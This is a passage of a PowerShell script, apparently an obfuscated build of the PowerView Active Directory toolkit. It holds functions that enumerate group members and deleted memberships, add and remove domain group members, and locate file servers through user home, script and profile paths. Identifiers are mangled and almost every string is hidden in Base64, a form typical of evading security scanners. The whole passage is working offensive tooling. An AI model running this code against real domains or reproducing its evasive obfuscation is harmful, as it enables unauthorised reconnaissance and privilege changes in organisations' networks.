                                if (${___/\/==\_/\/\/=\}) {
                                    ${_/===\/===\___/\_} = ${___/\/==\_/\/\/=\}.Split('@')[1]
                                }
                                else {
                                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQByAHIAbwByACAAYwBvAG4AdgBlAHIAdABpAG4AZwAgACQAewBfAF8ALwA9AFwAXwAvAFwALwA9AD0APQA9AFwALwA9AFwAfQA=')))
                                    ${_/===\/===\___/\_} = $Null
                                }
                            }
                            catch {
                                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQByAHIAbwByACAAYwBvAG4AdgBlAHIAdABpAG4AZwAgACQAewBfAF8ALwA9AFwAXwAvAFwALwA9AD0APQA9AFwALwA9AFwAfQA=')))
                                ${_/===\/===\___/\_} = $Null
                            }
                        }
                        else {
                            ${_/===\/===\___/\_} = ${__/=\_/\/====\/=\}.SubString(${__/=\_/\/====\/=\}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        }
                    }
                    catch {
                        ${__/=\_/\/====\/=\} = $Null
                        ${_/===\/===\___/\_} = $Null
                    }
                    if ($Properties.samaccountname) {
                        ${___/=\/==\/=\/===} = $Properties.samaccountname[0]
                    }
                    else {
                        try {
                            ${___/=\/==\/=\/===} = _/===\/=\_/\____/\ -__/\_/=\__/=\__/\ $Properties.cn[0] @/==\/===\/=\_____
                        }
                        catch {
                            ${___/=\/==\/=\/===} = $Properties.cn[0]
                        }
                    }
                    if ($Properties.objectclass -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG0AcAB1AHQAZQByAA==')))) {
                        ${_/\__/\/=\____/\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG0AcAB1AHQAZQByAA==')))
                    }
                    elseif ($Properties.objectclass -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA==')))) {
                        ${_/\__/\/=\____/\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA==')))
                    }
                    elseif ($Properties.objectclass -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgA=')))) {
                        ${_/\__/\/=\____/\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgA=')))
                    }
                    else {
                        ${_/\__/\/=\____/\_} = $Null
                    }
                    ${__/\_/=========\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) ${_/===\/===\___/\_}
                    ${__/\_/=========\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) ${___/=\/==\/=\/===}
                    ${__/\_/=========\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlAA=='))) ${__/=\_/\/====\/=\}
                    ${__/\_/=========\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATwBiAGoAZQBjAHQAQwBsAGEAcwBzAA=='))) ${_/\__/\/=\____/\_}
                    ${__/\_/=========\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIAUwBJAEQA'))) ${/==\/===\/\/\_/==}
                    ${__/\_/=========\_}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAHIAbwB1AHAATQBlAG0AYgBlAHIA'))))
                    ${__/\_/=========\_}
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAdQByAHMAZQA=')))] -and ${__/=\_/\/====\/=\} -and (${_/\__/\/=\____/\_} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA=='))))) {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAATQBhAG4AdQBhAGwAbAB5ACAAcgBlAGMAdQByAHMAaQBuAGcAIABvAG4AIABnAHIAbwB1AHAAOgAgACQAewBfAF8ALwA9AFwAXwAvAFwALwA9AD0APQA9AFwALwA9AFwAfQA=')))
                        ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${__/=\_/\/====\/=\}
                        $Null = ${/=\___/=\__/=\/\/}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA='))))
                        _/=\/\/=====\/\/== @/=\___/=\__/=\/\/
                    }
                }
            }
            ${__/\___/\/====\_/}.dispose()
        }
    }
}
function Get-DomainGroupMemberDeleted {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.DomainGroupMemberDeleted')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${/=\___/=\__/=\/\/} = @{
            'Properties'    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHIAZQBwAGwAdgBhAGwAdQBlAG0AZQB0AGEAZABhAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))
            'Raw'           =   $True
            'LDAPFilter'    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBnAHIAbwB1AHAAKQA=')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        ___/\___/\__/===\/ @/=\___/=\__/=\/\/ | % {
            ${/=\/\/\_/=\/\/=\_} = $_.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))][0]
            ForEach(${/===\/=\__/=\_/\_} in $_.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHIAZQBwAGwAdgBhAGwAdQBlAG0AZQB0AGEAZABhAHQAYQA=')))]) {
                ${___/===\/\/=\_/==} = [xml]${/===\/=\__/=\_/\_} | select -ExpandProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABTAF8AUgBFAFAATABfAFYAQQBMAFUARQBfAE0ARQBUAEEAXwBEAEEAVABBAA=='))) -ErrorAction SilentlyContinue
                if (${___/===\/\/=\_/==}) {
                    if ((${___/===\/\/=\_/==}.pszAttributeName -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIA')))) -and ((${___/===\/\/=\_/==}.dwVersion % 2) -eq 0 )) {
                        ${__/\/\/\_/\/\/=\/} = New-Object PSObject
                        ${__/\/\/\_/\/\/=\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQATgA='))) ${/=\/\/\_/=\/\/=\_}
                        ${__/\/\/\_/\/\/=\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABOAA=='))) ${___/===\/\/=\_/==}.pszObjectDn
                        ${__/\/\/\_/\/\/=\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBGAGkAcgBzAHQAQQBkAGQAZQBkAA=='))) ${___/===\/\/=\_/==}.ftimeCreated
                        ${__/\/\/\_/\/\/=\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGUAbABlAHQAZQBkAA=='))) ${___/===\/\/=\_/==}.ftimeDeleted
                        ${__/\/\/\_/\/\/=\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcAQwBoAGEAbgBnAGUA'))) ${___/===\/\/=\_/==}.ftimeLastOriginatingChange
                        ${__/\/\/\_/\/\/=\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBzAEEAZABkAGUAZAA='))) (${___/===\/\/=\_/==}.dwVersion / 2)
                        ${__/\/\/\_/\/\/=\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcARABzAGEARABOAA=='))) ${___/===\/\/=\_/==}.pszLastOriginatingDsaDN
                        ${__/\/\/\_/\/\/=\/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAG8AbQBhAGkAbgBHAHIAbwB1AHAATQBlAG0AYgBlAHIARABlAGwAZQB0AGUAZAA='))))
                        ${__/\/\/\_/\/\/=\/}
                    }
                }
                else {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBEAGUAbABlAHQAZQBkAF0AIABFAHIAcgBvAHIAIAByAGUAdAByAGkAZQB2AGkAbgBnACAAJwBtAHMAZABzAC0AcgBlAHAAbAB2AGEAbAB1AGUAbQBlAHQAYQBkAGEAdABhACcAIABmAG8AcgAgACcAJAB7AC8APQBcAC8AXAAvAFwAXwAvAD0AXAAvAFwALwA9AFwAXwB9ACcA')))
                }
            }
        }
    }
}
function Add-DomainGroupMember {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        ${__/====\___/==\_/},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${_/\/\__/=\__/\_/\} = @{
            'Identity' = $Identity
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/\__/=\__/\_/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\__/=\__/\_/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${_/\__/\/=\/=\/===} = ___/\__/===\__/\__ @_/\/\__/=\__/\_/\
        if (${_/\__/\/=\/=\/===}) {
            try {
                ${___/\__/\_/\_/\__} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity(${_/\__/\/=\/=\/===}.Context, ${_/\__/\/=\/=\/===}.Identity)
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBBAGQAZAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQByAHIAbwByACAAZgBpAG4AZABpAG4AZwAgAHQAaABlACAAZwByAG8AdQBwACAAaQBkAGUAbgB0AGkAdAB5ACAAJwAkAEkAZABlAG4AdABpAHQAeQAnACAAOgAgACQAXwA=')))
            }
        }
    }
    PROCESS {
        if (${___/\__/\_/\_/\__}) {
            ForEach (${/=\/\/\__/==\____} in ${__/====\___/==\_/}) {
                if (${/=\/\/\__/==\____} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgArAFwAXAAuACsA')))) {
                    ${_/\/\__/=\__/\_/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${/=\/\/\__/==\____}
                    ${/==\/\/\__/=\/\/\} = ___/\__/===\__/\__ @_/\/\__/=\__/\_/\
                    if (${/==\/\/\__/=\/\/\}) {
                        $UserIdentity = ${/==\/\/\__/=\/\/\}.Identity
                    }
                }
                else {
                    ${/==\/\/\__/=\/\/\} = ${_/\__/\/=\/=\/===}
                    $UserIdentity = ${/=\/\/\__/==\____}
                }
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBBAGQAZAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAQQBkAGQAaQBuAGcAIABtAGUAbQBiAGUAcgAgACcAJAB7AC8APQBcAC8AXAAvAFwAXwBfAC8APQA9AFwAXwBfAF8AXwB9ACcAIAB0AG8AIABnAHIAbwB1AHAAIAAnACQASQBkAGUAbgB0AGkAdAB5ACcA')))
                ${/=\/\/\__/==\____} = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity(${/==\/\/\__/=\/\/\}.Context, $UserIdentity)
                ${___/\__/\_/\_/\__}.Members.Add(${/=\/\/\__/==\____})
                ${___/\__/\_/\_/\__}.Save()
            }
        }
    }
}
function Remove-DomainGroupMember {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        ${__/====\___/==\_/},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${_/\/\__/=\__/\_/\} = @{
            'Identity' = $Identity
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/\__/=\__/\_/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\__/=\__/\_/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${_/\__/\/=\/=\/===} = ___/\__/===\__/\__ @_/\/\__/=\__/\_/\
        if (${_/\__/\/=\/=\/===}) {
            try {
                ${___/\__/\_/\_/\__} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity(${_/\__/\/=\/=\/===}.Context, ${_/\__/\/=\/=\/===}.Identity)
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBSAGUAbQBvAHYAZQAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQByAHIAbwByACAAZgBpAG4AZABpAG4AZwAgAHQAaABlACAAZwByAG8AdQBwACAAaQBkAGUAbgB0AGkAdAB5ACAAJwAkAEkAZABlAG4AdABpAHQAeQAnACAAOgAgACQAXwA=')))
            }
        }
    }
    PROCESS {
        if (${___/\__/\_/\_/\__}) {
            ForEach (${/=\/\/\__/==\____} in ${__/====\___/==\_/}) {
                if (${/=\/\/\__/==\____} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgArAFwAXAAuACsA')))) {
                    ${_/\/\__/=\__/\_/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${/=\/\/\__/==\____}
                    ${/==\/\/\__/=\/\/\} = ___/\__/===\__/\__ @_/\/\__/=\__/\_/\
                    if (${/==\/\/\__/=\/\/\}) {
                        $UserIdentity = ${/==\/\/\__/=\/\/\}.Identity
                    }
                }
                else {
                    ${/==\/\/\__/=\/\/\} = ${_/\__/\/=\/=\/===}
                    $UserIdentity = ${/=\/\/\__/==\____}
                }
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBSAGUAbQBvAHYAZQAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAUgBlAG0AbwB2AGkAbgBnACAAbQBlAG0AYgBlAHIAIAAnACQAewAvAD0AXAAvAFwALwBcAF8AXwAvAD0APQBcAF8AXwBfAF8AfQAnACAAZgByAG8AbQAgAGcAcgBvAHUAcAAgACcAJABJAGQAZQBuAHQAaQB0AHkAJwA=')))
                ${/=\/\/\__/==\____} = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity(${/==\/\/\__/=\/\/\}.Context, $UserIdentity)
                ${___/\__/\_/\_/\__}.Members.Remove(${/=\/\/\__/==\____})
                ${___/\__/\_/\_/\__}.Save()
            }
        }
    }
}
function _/==\/=\/==\/\___/ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        function _/======\/==\___/= {
            Param([String]$Path)
            if ($Path -and ($Path.split('\\').Count -ge 3)) {
                ${__/==\/\/\___/\/\} = $Path.split('\\')[2]
                if (${__/==\/\/\___/\/\} -and (${__/==\/\/\___/\/\} -ne '')) {
                    ${__/==\/\/\___/\/\}
                }
            }
        }
        ${/=\___/=\__/=\/\/} = @{
            'LDAPFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYAMwA2ADgAKQAoACEAKAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADIAKQApACgAfAAoAGgAbwBtAGUAZABpAHIAZQBjAHQAbwByAHkAPQAqACkAKABzAGMAcgBpAHAAdABwAGEAdABoAD0AKgApACgAcAByAG8AZgBpAGwAZQBwAGEAdABoAD0AKgApACkAKQA=')))
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQAsAHMAYwByAGkAcAB0AHAAYQB0AGgALABwAHIAbwBmAGkAbABlAHAAYQB0AGgA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            ForEach ($TargetDomain in $Domain) {
                ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $TargetDomain
                ${__/\_______/\/=\/} = __/=\/\_/\/=\__/=\ @/=\___/=\__/=\/\/
                $(ForEach(${/=\/==\___/\_/\/=} in ${__/\_______/\/=\/}.FindAll()) {if (${/=\/==\___/\_/\/=}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQA=')))]) {_/======\/==\___/=(${/=\/==\___/\_/\/=}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQA=')))])}if (${/=\/==\___/\_/\/=}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBjAHIAaQBwAHQAcABhAHQAaAA=')))]) {_/======\/==\___/=(${/=\/==\___/\_/\/=}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBjAHIAaQBwAHQAcABhAHQAaAA=')))])}if (${/=\/==\___/\_/\/=}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAG8AZgBpAGwAZQBwAGEAdABoAA==')))]) {_/======\/==\___/=(${/=\/==\___/\_/\/=}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAG8AZgBpAGwAZQBwAGEAdABoAA==')))])}}) | sort -Unique
            }
        }
        else {
            ${__/\_______/\/=\/} = __/=\/\_/\/=\__/=\ @/=\___/=\__/=\/\/
